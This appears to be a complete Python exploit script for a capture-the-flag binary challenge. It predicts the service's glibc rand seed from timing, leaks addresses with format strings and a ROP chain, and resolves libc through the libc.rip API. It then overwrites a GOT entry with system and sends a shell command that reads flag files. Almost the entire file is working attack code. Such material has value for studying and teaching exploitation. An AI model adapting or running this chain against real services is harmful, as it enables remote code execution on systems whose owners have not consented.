import time, re, json, urllib.request
from lib78 import *
from lib78 import ONE_WAY

COMMAND = b'cat /flag*;cat /home/*/flag*;ls /\n'
OFF_GETNAME = 0x1428


def align_send(c, data, lo=0.06, hi=0.28):
    while True:
        t = time.time()
        if lo <= (t % 1) <= hi:
            c.send(data)
            return t
        time.sleep(0.006)


def libc_lookup(puts_addr, start_main_ret):
    body = json.dumps({"symbols": {"puts": hex(puts_addr), "__libc_start_main_ret": hex(start_main_ret)}}).encode()
    req = urllib.request.Request('https://libc.rip/api/find', data=body, headers={'Content-Type': 'application/json'})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.load(r)


def fmt_addr(spec, target):
    b = spec.encode() + b'\x00'
    b += b'\x00' * (16 - len(b))
    return b + p64(target)


def attempt(v=False):
    c = Conn()
    try:
        # 读到 banner + 空行，用接收时刻反推 seed
        c.s.settimeout(3)
        buf = b''
        while buf.count(b'\n') < 2:
            d = c.s.recv(1)
            if not d:
                return None
            buf += d
        T = time.time()
        c.buf = buf.split(b'\n', 2)[2] if buf.count(b'\n') >= 3 else b''
        c.send(str(GlibcRand(int(T - ONE_WAY)).next()).encode() + b'\n')
        out, ok = c.read_until('说出你想要说的话吧'.encode())
        if not ok:
            return None
        t1 = align_send(c, b'%15$p.%17$p\n')
        out, ok = c.read_until('如果只是许愿'.encode())
        m = re.findall(rb'0x[0-9a-f]+', out)
        if len(m) < 2:
            return None
        base = int(m[0], 16) - OFF_RET_MAIN
        libc_ret = int(m[1], 16)
        c.read_until('做你想要做的事吧'.encode())
        c.send(str(GlibcRand(int(t1 + ONE_WAY)).next()).encode() + b'\n')
        out, ok = c.read_until('做你想要做的事吧'.encode())
        if not ok:
            return None
        if v:
            print('  base', hex(base))

        # 轮1：eL#2 泄漏 puts，然后回 get_name
        chain1 = [base + OFF_RET, base + OFF_ECHO, base + OFF_GUESS, base + OFF_GETNAME]
        c.send(b'A' * 0x40 + p64(0) + b''.join(p64(x) for x in chain1))
        time.sleep(0.2)
        c.send(fmt_addr('%6$s', base + OFF_PUTS_GOT))
        time.sleep(0.7); c.pull(0.6)
        raw = c.buf
        off = 2 if raw[:2] == b':\n' else 0
        if len(raw) < off + 6:
            return None
        puts_addr = int.from_bytes(raw[off:off + 6], 'little')
        c.buf = raw[off + 6:]
        if not (0x700000000000 < puts_addr < 0x800000000000):
            return None
        if v:
            print('  puts', hex(puts_addr))

        res = libc_lookup(puts_addr, libc_ret)
        if not res:
            return None
        sym = res[0]['symbols']
        system = libc_ret - int(sym['__libc_start_main_ret'], 16) + int(sym['system'], 16)

        # guess_rand 读数字（结果无所谓）
        o, ok = c.read_until('做出你的选择吧'.encode(), timeout=4)
        if not ok:
            return None
        c.send(b'1\n')
        time.sleep(0.5); c.pull(0.4); c.buf = b''
        if v:
            print('  after guess_rand')

        # 轮2：写 GOT
        got = base + OFF_STRTOUL_GOT
        lo = system & 0xffff
        d = (((system >> 16) & 0xffff) - lo) % 0x10000
        fs = ('%%%dc%%16$hn%%%dc%%17$hn' % (lo, d)).encode()
        chain2 = [base + OFF_RET, base + OFF_ECHO, base + OFF_GUESS, got, got + 2]
        c.send(b'B' * 0x40 + p64(0) + b''.join(p64(x) for x in chain2))
        time.sleep(0.25)
        c.send(fs)
        time.sleep(0.8); c.pull(0.7)
        if v:
            print('  wrote got, tail:', c.buf[-20:])

        # 交给 system
        o, ok = c.read_until('做出你的选择吧'.encode(), timeout=4)
        if not ok:
            return None
        c.send(COMMAND)
        time.sleep(1.8); c.pull(1.5)
        return c.buf
    finally:
        c.close()


if __name__ == '__main__':
    for i in range(20):
        try:
            r = attempt(v=True)
        except Exception as e:
            print('err', repr(e)); time.sleep(0.5); continue
        if r:
            txt = r.decode('utf-8', 'replace')
            print('--- 尝试 %d 输出 ---' % i)
            print(txt[:800])
            if 'HTUCTF' in txt or 'flag{' in txt:
                open('flag.txt', 'w').write(txt)
                break
        else:
            print('尝试 %d 失败' % i)
